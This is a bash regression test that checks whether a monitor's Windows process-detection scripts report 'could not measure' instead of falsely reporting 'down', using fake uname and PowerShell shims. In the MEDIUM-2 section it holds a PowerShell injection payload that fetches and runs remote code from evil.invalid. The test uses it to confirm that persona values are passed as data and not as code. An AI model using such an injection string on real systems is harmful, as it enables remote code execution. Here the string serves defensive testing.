#!/usr/bin/env bash
# Does the producer/consumer detection tell the truth on NATIVE WINDOWS (Git Bash / MSYS)?
#
# WHY THIS EXISTS. praetor ran the monitor on a real Windows 11 seat (2026-09-27): Git Bash has no
# `pgrep`, and MSYS `ps` cannot see native Windows processes, so every probe answered "not running".
# session-catchup-hint.sh said "producer: DOWN" beside a producer that was delivering mail, suggested
# launchctl/systemctl (neither exists there), and the duplicate-consumer check could never find the
# consumer that was already armed.
#
# ⛔ THE PROPERTY UNDER TEST: when a host gives the scripts no way to look, the answer is COULD NOT
# MEASURE, never DOWN. And when it can look (PowerShell / Win32_Process), it must look there.
#
# HOW IT TESTS THE REAL SCRIPTS. There is no Windows here, so the two things that differ are shimmed on
# PATH: `uname` (reports MINGW64) and `powershell.exe` (answers the process counts the scripts ask for,
# from the environment). The shipped scripts run byte-for-byte.
#
#   bash tests/windows_detect_test.sh
set -u
REPO="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
LIB="$REPO/providers/claude/scripts/kijito-persona-lib.sh"
HOOK="$REPO/providers/claude/scripts/session-catchup-hint.sh"
SELFTEST="$REPO/providers/claude/scripts/inbox-selftest.sh"
pass=0; fail=0
red() { printf "  FAIL  %s\n" "$1"; fail=$((fail+1)); }
grn() { printf "  ok    %s\n" "$1"; pass=$((pass+1)); }

command -v jq >/dev/null 2>&1 || { echo "SKIP: jq not installed — the hook parses its stdin with jq."; exit 0; }

_RUNTMP="$(mktemp -d)"; export TMPDIR="$_RUNTMP"
trap 'rm -rf "$_RUNTMP"' EXIT INT TERM

# A PATH THAT CANNOT FIND POWERSHELL, even on a host that ships it: GitHub's ubuntu runners carry
# /usr/bin/pwsh, so "prepend a shim dir without PowerShell" still found the real one there, it answered 0,
# and the could-not-measure cases read DOWN (CI, 2026-09-29). Mirror every tool on PATH except PowerShell.
_nops_sys() {  # $1 = dir to fill
  local d f n; mkdir -p "$1"
  local IFS=:
  for d in $PATH; do
    [ -d "$d" ] || continue
    for f in "$d"/*; do
      n=${f##*/}
      case "$n" in pwsh|pwsh.exe|pwsh-*|powershell|powershell.exe) continue ;; esac
      [ -x "$f" ] && [ ! -e "$1/$n" ] && ln -s "$f" "$1/$n"
    done
  done
}
SYS="$_RUNTMP/sys"; _nops_sys "$SYS"

# Two shim dirs: WIN has uname + powershell.exe; WIN_NOPS has uname only (a host where we cannot look).
WIN="$_RUNTMP/win"; WIN_NOPS="$_RUNTMP/win-nops"; mkdir -p "$WIN" "$WIN_NOPS"
for d in "$WIN" "$WIN_NOPS"; do
  printf '#!/usr/bin/env bash\necho MINGW64_NT-10.0-26200\n' > "$d/uname"
  cat > "$d/kijito-inbox-monitor" <<SHIM
#!/usr/bin/env bash
exec python3 "$REPO/providers/monitor/kijito_inbox_monitor.py" "\$@"
SHIM
  chmod +x "$d/uname" "$d/kijito-inbox-monitor"
done
cat > "$WIN/powershell.exe" <<'SHIM'
#!/usr/bin/env bash
# Fake PowerShell: answer the Win32_Process count the caller asked for. Records every query so the test
# can assert WHAT was asked (the tail.exe anchor, the stream's basename).
printf '%s\n' "$*" >> "${PS_LOG:-/dev/null}"
# A value the caller passed as DATA (never in the command text) - logged on its own line (MEDIUM-2).
printf 'KIJITO_PS_ARG=%s\n' "${KIJITO_PS_ARG:-}" >> "${PS_LOG:-/dev/null}"
[ -n "${FAKE_PS_GARBAGE:-}" ] && { echo "Get-CimInstance : Access denied"; exit 1; }
case "$*" in
  # The LIST query (kijito_stream_consumers) asks for "<pid> <age-seconds>" per tail.exe.
  *"-eq 'tail.exe'"*ForEach-Object*) [ "${FAKE_TAIL:-0}" -gt 0 ] && echo "9001 ${FAKE_TAIL_AGE:-300}" ;;
  *"-eq 'tail.exe'"*) echo "${FAKE_TAIL:-0}" ;;
  *)          echo "${FAKE_PROD:-0}" ;;
esac
SHIM
chmod +x "$WIN/powershell.exe"

lib_call() {  # $1=shimdir, rest = function + args; prints "rc=<n>" (and any stdout)
  local sd="$1"; shift
  env PATH="$sd:$SYS" bash -c '. "$0"; "$@"; echo "rc=$?"' "$LIB" "$@" 2>/dev/null
}

echo "windows detection checks:"

# ── the library ──────────────────────────────────────────────────────────────────────────────────
[ "$(lib_call "$WIN" kijito_host_is_windows)" = "rc=0" ] && grn "MINGW uname is recognised as native Windows" \
  || red "MINGW uname not recognised as Windows"
[ "$(env PATH="/usr/bin:/bin" bash -c '. "$0"; kijito_host_is_windows; echo rc=$?' "$LIB")" = "rc=1" ] \
  && grn "a real Linux uname is not Windows" || red "Linux was classified as Windows"

out=$(FAKE_PROD=2 lib_call "$WIN" kijito_producer_running)
[ "$out" = "rc=0" ] && grn "producer: PowerShell count 2 (a venv launcher + child) => running (0)" || red "count 2 gave $out"
out=$(FAKE_PROD=0 lib_call "$WIN" kijito_producer_running)
[ "$out" = "rc=1" ] && grn "producer: PowerShell count 0 => not running (1)" || red "count 0 gave $out"
out=$(lib_call "$WIN_NOPS" kijito_producer_running)
[ "$out" = "rc=2" ] && grn "producer: no PowerShell => COULD NOT MEASURE (2), not DOWN" || red "no PowerShell gave $out"
out=$(FAKE_PS_GARBAGE=1 lib_call "$WIN" kijito_producer_running)
[ "$out" = "rc=2" ] && grn "producer: PowerShell error text => COULD NOT MEASURE (2), never parsed as a count" || red "garbage gave $out"

export PS_LOG="$_RUNTMP/ps.log"; : > "$PS_LOG"
out=$(FAKE_TAIL=1 lib_call "$WIN" kijito_stream_consumed "/c/Users/j/.cache/kijito-inbox-monitor/events.praetor.ndjson")
[ "$out" = "rc=0" ] && grn "consumer: a tail.exe on the stream => consumed (0)" || red "tail count 1 gave $out"
if grep -q "tail.exe" "$PS_LOG" && grep -q "events.praetor.ndjson" "$PS_LOG"; then
  grn "consumer: the query is anchored on tail.exe AND this stream's basename"
else red "consumer query lacks the tail.exe anchor or the basename: $(cat "$PS_LOG")"; fi
unset PS_LOG

# ── MEDIUM-2 (river's 0.2.11 review): a persona is DATA, never PowerShell code ──────────────────────
# .kijito_persona comes from whatever repo the user cloned, so a marker carrying a quote must not be able to
# break out of the Where-Object filter. The shim cannot evaluate PowerShell, so assert the contract instead:
# the hostile string never appears in the command text and reaches PowerShell only as $env:KIJITO_PS_ARG.
export PS_LOG="$_RUNTMP/ps-hostile.log"; : > "$PS_LOG"
EVIL="x' -or (iwr https://evil.invalid|iex) -or 'y"
lib_call "$WIN" kijito_producer_covers "$EVIL" >/dev/null
cmdtext=$(grep -v '^KIJITO_PS_ARG=' "$PS_LOG")
if [ -z "$cmdtext" ]; then red "producer_covers sent no PowerShell query - this check measured nothing"
elif grep -qF "iwr https://evil.invalid" <<<"$cmdtext"; then red "a hostile persona reached the PowerShell COMMAND TEXT: $cmdtext"
elif grep -qxF "KIJITO_PS_ARG=$EVIL" "$PS_LOG"; then grn "a hostile persona reaches PowerShell only as data (\$env:KIJITO_PS_ARG), never as code"
else red "the persona was not passed as \$env:KIJITO_PS_ARG: $(cat "$PS_LOG")"; fi
# LOW-3: --persona is matched as a WHOLE, escaped argument (riverbank must not cover river).
if grep -qF "[regex]::Escape(\$env:KIJITO_PS_ARG)" <<<"$cmdtext" && grep -qF "(\s|\$)" <<<"$cmdtext" && ! grep -qF "*--persona" <<<"$cmdtext"; then
  grn "the Windows --persona match is whole-argument and regex-escaped (no '*--persona <p>*' substring)"
else red "the Windows --persona match is still a substring or unescaped: $cmdtext"; fi
: > "$PS_LOG"
lib_call "$WIN" kijito_stream_consumed "/x/events.a'b.ndjson" >/dev/null
if grep -qF "a'b" <<<"$(grep -v '^KIJITO_PS_ARG=' "$PS_LOG")"; then red "a stream name reached the consumer query's command text"
else grn "the consumer query passes the stream name as data too"; fi
unset PS_LOG
out=$(FAKE_TAIL=0 lib_call "$WIN" kijito_stream_consumed "/x/events.praetor.ndjson")
[ "$out" = "rc=1" ] && grn "consumer: no tail.exe => not consumed (1)" || red "tail count 0 gave $out"
out=$(lib_call "$WIN_NOPS" kijito_stream_consumed "/x/events.praetor.ndjson")
[ "$out" = "rc=2" ] && grn "consumer: no PowerShell => COULD NOT MEASURE (2)" || red "no PowerShell consumer gave $out"

out=$(lib_call "$WIN" kijito_restart_hint task praetor)
if grep -q "kijito-inbox-monitor --persona praetor" <<<"$out" && grep -q "schtasks" <<<"$out" \
   && ! grep -qE "launchctl|systemctl" <<<"$out"; then
  grn "restart hint on Windows: manual start first, Scheduled Task as the opt-in, no launchctl/systemctl"
else red "Windows restart hint wrong: $out"; fi

# ── the SessionStart hook, on praetor's layout (~/.cache/kijito-inbox-monitor/events.<p>.ndjson) ─────
run_hook() {  # $1=shimdir $2=HOME $3=project
  printf '{"source":"startup","cwd":"%s"}' "$3" \
    | env -u TMUX -u TMUX_PANE -u KIJITO_AUTOCATCHUP PATH="$1:$SYS" HOME="$2" CLAUDE_PROJECT_DIR="$3" bash "$HOOK" 2>/dev/null
}
H="$(mktemp -d)"; mkdir -p "$H/.cache/kijito-inbox-monitor"; : > "$H/.cache/kijito-inbox-monitor/events.praetor.ndjson"
P="$(mktemp -d)"; echo praetor > "$P/.kijito_persona"

out=$(FAKE_PROD=1 FAKE_TAIL=0 run_hook "$WIN" "$H" "$P")
grep -q "producer: UP for 'praetor'" <<<"$out" && grn "hook: a running Windows producer reads UP (was DOWN)" \
  || red "hook did not report UP on Windows: $(grep -o 'inbox-monitor producer:[^.]*' <<<"$out" | head -1)"
grep -qE "launchctl|systemctl" <<<"$out" && red "hook still offers launchctl/systemctl on Windows" \
  || grn "hook: no launchctl/systemctl on Windows"

out=$(FAKE_PROD=0 run_hook "$WIN" "$H" "$P")
if grep -q "producer: DOWN" <<<"$out" && grep -q "kijito-inbox-monitor --persona praetor" <<<"$out"; then
  grn "hook: a genuinely absent Windows producer reads DOWN with the manual start command"
else red "hook DOWN-on-Windows output wrong: $(grep -o 'inbox-monitor producer:.*' <<<"$out" | head -1)"; fi

out=$(run_hook "$WIN_NOPS" "$H" "$P")
if grep -q "COULD NOT CHECK" <<<"$out" && ! grep -q "producer: DOWN" <<<"$out"; then
  grn "hook: no way to look => COULD NOT CHECK, never DOWN"
else red "hook without PowerShell said: $(grep -o 'inbox-monitor producer:.*' <<<"$out" | head -1)"; fi
grep -q "could NOT check for an existing consumer" <<<"$out" \
  && grn "hook: warns that the duplicate-consumer check could not run" \
  || red "hook gave no could-not-check caveat for the consumer"

out=$(FAKE_PROD=1 FAKE_TAIL=1 run_hook "$WIN" "$H" "$P")
grep -q "a consumer already tails your stream" <<<"$out" \
  && grn "hook: an armed tail.exe is recognised (no second consumer suggested)" \
  || red "hook missed the armed Windows consumer"
grep -q "9001 (up 5 min)" <<<"$out" && ! grep -q "LEAKED ORPHANS" <<<"$out" \
  && grn "hook: the Windows consumer is listed with its age; a 5-min tail is not an orphan" \
  || red "hook's Windows consumer line lacks pid/age or called a live tail an orphan"
# Windows does not kill a tail when its Monitor expires (crucible [35702]): an old one must be flagged.
out=$(FAKE_PROD=1 FAKE_TAIL=1 FAKE_TAIL_AGE=7200 run_hook "$WIN" "$H" "$P")
grep -q "LEAKED ORPHANS" <<<"$out" && grep -q "9001 (up 120 min)" <<<"$out" \
  && grn "hook: a 2-hour-old tail.exe is flagged as a possible leaked orphan" \
  || red "hook reported a 2-hour-old Windows tail as a plain live consumer"

# ── inbox-selftest ──────────────────────────────────────────────────────────────────────────────
out=$(env PATH="$WIN_NOPS:$SYS" HOME="$H" bash "$SELFTEST" --persona praetor --no-send 2>&1); rc=$?
if [ "$rc" -eq 2 ] && grep -q "COULD NOT MEASURE" <<<"$out" && ! grep -q "FAIL  consumer" <<<"$out"; then
  grn "selftest: consumer unknowable => exit 2 COULD NOT MEASURE, not FAIL"
else red "selftest without PowerShell gave rc=$rc: $(tail -3 <<<"$out")"; fi
out=$(env PATH="$WIN:$SYS" FAKE_TAIL=1 HOME="$H" bash "$SELFTEST" --persona praetor --no-send 2>&1); rc=$?
grep -q "ok    consumer" <<<"$out" && grn "selftest: an armed tail.exe passes the consumer hop" \
  || red "selftest missed the armed Windows consumer (rc=$rc): $(tail -3 <<<"$out")"

echo
echo "passed: $pass   failed: $fail"
[ "$fail" -eq 0 ] || exit 1
